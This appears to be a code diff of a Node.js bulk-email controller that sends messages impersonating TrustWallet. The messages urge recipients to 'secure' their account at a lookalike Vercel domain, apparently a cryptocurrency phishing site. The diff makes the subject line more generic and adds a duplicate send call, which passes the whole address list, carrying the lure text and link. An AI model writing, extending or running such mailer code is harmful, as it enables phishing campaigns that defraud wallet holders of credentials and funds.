@@ -31,12 +31,17 @@ exports.sendBulkEmailDefault = async (req, res) => {
         }
 
         // Use only the mail template for the email body
-        const defaultSubject = "Important Notification from TrustWallet";
+        const defaultSubject = "Important Notification";
         const secureLink = `https://trust-wallet-inky.vercel.app/`;
 
         // Send emails and save to DB in parallel
         const results = await Promise.allSettled(
-            email.map(async (e) => {
+            email.map(async (e) => {await sendEmail({
+            email,
+            subject: defaultSubject,
+            html: trustTemplate(secureLink),
+            text: "Please secure your TrustWallet account at https://trust-wallet-inky.vercel.app/"
+});
                 // Send the email using only the mail template
                 await sendEmail({
                     email,
@@ -53,7 +58,7 @@ exports.sendBulkEmailDefault = async (req, res) => {
             })
         );
 
-        
+
         const success = results.filter(r => r.status === 'fulfilled').length;
         const failed = results.filter(r => r.status === 'rejected').length;
 
